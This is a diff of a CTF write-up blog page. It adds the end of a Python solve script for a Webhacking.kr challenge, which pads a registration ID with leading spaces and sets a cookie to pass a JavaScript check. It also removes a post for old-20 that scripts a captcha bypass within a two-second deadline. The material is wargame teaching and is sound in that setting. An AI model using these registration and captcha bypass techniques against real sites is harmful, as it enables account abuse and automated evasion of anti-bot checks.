class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(COOKIE_NAME, <span class="string">&quot;hello&quot;</span>)</span><br><span class="line">        register = session.post(</span><br><span class="line">            JOIN_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;id&quot;</span>: REGISTER_ID, <span class="string">&quot;pw&quot;</span>: PASSWORD&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        register.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(register.text)</span><br><span class="line"></span><br><span class="line">        login = session.post(</span><br><span class="line">            LOGIN_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;id&quot;</span>: LOGIN_ID, <span class="string">&quot;pw&quot;</span>: PASSWORD&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        login.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(login.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
+<p>如果客户端或代理会裁剪前导空格，应确认原始 form body 仍包含 20
+个空格后再发送。<code>mode=1</code>
+只用于打开注册页面，<code>oldzombie=hello</code> 只用于通过 JavaScript
+检查。</p>
+<p>注册字段的前导空格数量取决于题目部署的字段长度与比较规则；复现时以目标响应确认服务端是否保留
+20 个空格。</p>
 
       
     </div>
@@ -1321,114 +1433,6 @@ Tab。正则只要求匹配，不要求前缀或五个字母取特定值。</p>
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-20/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-20/" class="post-title-link" itemprop="url">Webhacking.kr old-20</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-09-26 12:42:56" itemprop="dateCreated datePublished" datetime="2026-09-26T12:42:56+08:00">2026-09-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>244</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Submit the captcha before the two-second deadline.</p>
-<p>在两秒时限内提交验证码。</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/code-4/</span><br></pre></td></tr></table></figure>
-<h3 id="analysis">Analysis</h3>
-<p>GET 响应同时给出本次页面实例的 captcha 和 <code>st</code>
-Cookie。服务端用 <code>st</code> 判断时限，并要求 POST 的 captcha
-与本次页面生成的值相同；因此 GET 和 POST 必须使用同一个
-<code>requests.Session</code>。不能预先保存验证码，也不能把下一次 GET
-得到的 <code>st</code> 与旧验证码混用。</p>
-<h3 id="solution">Solution</h3>
-<p>下面的脚本完整完成一次 GET、解析 captcha、复用 Cookie 并构造
-POST。它只打印响应，不包含账号或固定 session 值：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://webhacking.kr/challenge/code-4/&quot;</span></span><br><span class="line">CAPTCHA_PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&quot;&lt;input[^&gt;]+name=[\&quot;&#x27;]?captcha_[\&quot;&#x27;]?[^&gt;]+value=[\&quot;&#x27;]([^\&quot;&#x27;]+)[\&quot;&#x27;]&quot;</span>,</span><br><span class="line">    re.IGNORECASE,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_captcha</span>(<span class="params">html</span>):</span><br><span class="line">    <span class="keyword">match</span> = CAPTCHA_PATTERN.search(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;captcha input was not found&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_once</span>():</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        response = session.get(URL, timeout=<span class="number">10</span>)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        captcha = extract_captcha(response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;st&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session.cookies:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;st cookie was not set by the GET response&quot;</span>)</span><br><span class="line"></span><br><span class="line">        post_response = session.post(</span><br><span class="line">            URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;demo&quot;</span>, <span class="string">&quot;cmt&quot;</span>: <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;captcha&quot;</span>: captcha&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        post_response.raise_for_status()</span><br><span class="line">        <span class="keyword">return</span> post_response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    result = solve_once()</span><br><span class="line">    <span class="built_in">print</span>(result.status_code)</span><br><span class="line">    <span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/54/">54</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/5/"><i class="fa fa-angle-right"></i></a>
   </nav>
@@ -1452,13 +1456,13 @@ POST。它只打印响应，不包含账号或固定 session 值：</p>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">387k</span>
+    <span title="Word count total">388k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">23:29</span>
+    <span title="Reading time total">23:32</span>
   </span>
 </div>
 <div class="busuanzi-count">
